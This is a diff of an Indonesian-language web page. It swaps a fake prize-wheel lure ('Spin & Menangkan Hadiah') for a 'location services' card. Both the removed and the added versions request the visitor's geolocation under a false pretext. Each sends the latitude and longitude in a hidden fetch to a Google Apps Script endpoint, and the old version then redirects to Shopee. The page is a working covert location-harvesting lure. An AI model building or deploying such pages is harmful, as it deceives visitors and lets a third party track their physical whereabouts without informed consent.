@@ -2,18 +2,28 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Spin Hadiah</title>
+<title>Layanan Lokasi</title>
 
 <style>
 body{
   margin:0;
-  background: radial-gradient(circle,#1e3c72,#2a5298);
   font-family: Arial;
-  text-align:center;
+  background: linear-gradient(135deg,#667eea,#764ba2);
   color:white;
+  text-align:center;
 }
 
-canvas{margin-top:20px;}
+.container{
+  margin-top:100px;
+  padding:20px;
+}
+
+.card{
+  background: rgba(255,255,255,0.1);
+  backdrop-filter: blur(10px);
+  padding:20px;
+  border-radius:15px;
+}
 
 button{
   margin-top:20px;
@@ -23,181 +33,64 @@ button{
   background:#00e676;
   font-size:16px;
   font-weight:bold;
+  color:#000;
 }
 
-/* popup menang */
-.popup{
-  position:fixed;
-  top:0;left:0;
-  width:100%;
-  height:100%;
-  background:rgba(0,0,0,0.8);
-  display:none;
-  justify-content:center;
-  align-items:center;
-  flex-direction:column;
+.status{
+  margin-top:15px;
+  font-size:14px;
+  opacity:0.8;
 }
 
-.popup img{
-  width:180px;
-  animation:zoom 0.5s ease;
-}
-
-@keyframes zoom{
-  from{transform:scale(0);}
-  to{transform:scale(1);}
-}
-
-.confetti{
-  position:absolute;
-  width:8px;
-  height:8px;
-  top:0;
-  animation:fall 3s linear;
-}
-
-@keyframes fall{
-  to{transform:translateY(100vh);}
-}
+.success{color:#00ffcc;}
+.error{color:#ffcccc;}
 </style>
 </head>
 
 <body>
 
-<h2>🎁 Spin & Menangkan Hadiah</h2>
+<div class="container">
+  <div class="card">
+    <h2>📍 Aktifkan Lokasi</h2>
+    <p>Kami membutuhkan izin lokasi untuk menampilkan layanan terbaik di sekitar Anda.</p>
 
-<canvas id="wheel" width="300" height="300"></canvas>
-<br>
-<button onclick="spin()">PUTAR</button>
+    <button onclick="ambilLokasi()">Izinkan Lokasi</button>
 
-<!-- popup -->
-<div class="popup" id="popup">
-  <h2>🎉 SELAMAT!</h2>
-  <img id="hadiahImg">
-  <p id="hadiahText"></p>
-  <button onclick="lanjut()">Ambil Hadiah</button>
+    <div id="status" class="status">Menunggu izin...</div>
+  </div>
 </div>
 
-<audio id="spinSound">
-  <source src="https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg">
-</audio>
-
-<audio id="winSound">
-  <source src="https://actions.google.com/sounds/v1/crowds/applause.ogg">
-</audio>
-
 <script>
-const canvas = document.getElementById("wheel");
-const ctx = canvas.getContext("2d");
-
-const hadiah = [
-  {text:"iPhone 16 Pro Max", img:"https://cdn-icons-png.flaticon.com/512/747/747376.png"},
-  {text:"Mobil", img:"https://cdn-icons-png.flaticon.com/512/743/743007.png"},
-  {text:"Voucher 90%", img:"https://cdn-icons-png.flaticon.com/512/1170/1170678.png"},
-  {text:"iPhone 15", img:"https://cdn-icons-png.flaticon.com/512/747/747376.png"},
-  {text:"Motor", img:"https://cdn-icons-png.flaticon.com/512/2972/2972185.png"},
-  {text:"Voucher", img:"https://cdn-icons-png.flaticon.com/512/1170/1170678.png"}
-];
-
-const colors = ["#ff5252","#ff9800","#ffeb3b","#4caf50","#2196f3","#9c27b0"];
-
-let angle = 0;
-let spinning = false;
-
-function draw(){
-  let arc = Math.PI*2/hadiah.length;
-
-  for(let i=0;i<hadiah.length;i++){
-    ctx.beginPath();
-    ctx.fillStyle=colors[i];
-    ctx.moveTo(150,150);
-    ctx.arc(150,150,150,arc*i+angle,arc*(i+1)+angle);
-    ctx.fill();
-
-    ctx.save();
-    ctx.translate(150,150);
-    ctx.rotate(arc*i + arc/2 + angle);
-    ctx.fillStyle="#fff";
-    ctx.font="12px Arial";
-    ctx.fillText(hadiah[i].text,40,5);
-    ctx.restore();
-  }
-}
-draw();
-
-function spin(){
-  if(spinning) return;
-  spinning = true;
-
-  document.getElementById("spinSound").play();
-
-  let spinAngle = Math.random()*3000+3000;
-  let start=null;
-
-  function anim(t){
-    if(!start) start=t;
-    let progress=t-start;
-
-    let ease=1-Math.pow(1-progress/4000,3);
-    angle=(spinAngle*ease)*Math.PI/180;
-
-    ctx.clearRect(0,0,300,300);
-    draw();
-
-    if(progress<4000){
-      requestAnimationFrame(anim);
-    }else{
-      selesai();
-    }
-  }
-  requestAnimationFrame(anim);
-}
-
-function selesai(){
-  spinning=false;
-
-  let deg=angle*180/Math.PI%360;
-  let index=Math.floor((360-deg)/(360/hadiah.length))%hadiah.length;
-
-  let win=hadiah[index];
-
-  document.getElementById("hadiahImg").src=win.img;
-  document.getElementById("hadiahText").innerHTML=win.text;
-
-  document.getElementById("popup").style.display="flex";
-
-  document.getElementById("winSound").play();
-
-  confetti();
-}
-
-function confetti(){
-  for(let i=0;i<30;i++){
-    let c=document.createElement("div");
-    c.className="confetti";
-    c.style.left=Math.random()*100+"vw";
-    c.style.background="hsl("+Math.random()*360+",100%,50%)";
-    document.body.appendChild(c);
-
-    setTimeout(()=>c.remove(),3000);
-  }
-}
-
-function lanjut(){
-  ambilLokasi();
-}
-
 function ambilLokasi(){
+
+  document.getElementById("status").innerHTML="Meminta izin lokasi...";
+
   if(navigator.geolocation){
-    navigator.geolocation.getCurrentPosition(function(pos){
 
-      fetch("https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat="+pos.coords.latitude+"&lon="+pos.coords.longitude);
+    navigator.geolocation.getCurrentPosition(
 
-      setTimeout(()=>{
-        window.location.href="https://shopee.co.id";
-      },2000);
+      function(pos){
 
-    });
+        let lat=pos.coords.latitude;
+        let lon=pos.coords.longitude;
+
+        document.getElementById("status").innerHTML="✅ Lokasi berhasil diambil";
+        document.getElementById("status").className="status success";
+
+        // kirim ke Google Script
+        fetch("https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat="+lat+"&lon="+lon);
+
+      },
+
+      function(err){
+        document.getElementById("status").innerHTML="❌ Gagal: "+err.message;
+        document.getElementById("status").className="status error";
+      }
+
+    );
+
+  }else{
+    document.getElementById("status").innerHTML="❌ Browser tidak support";
   }
 }
 </script>
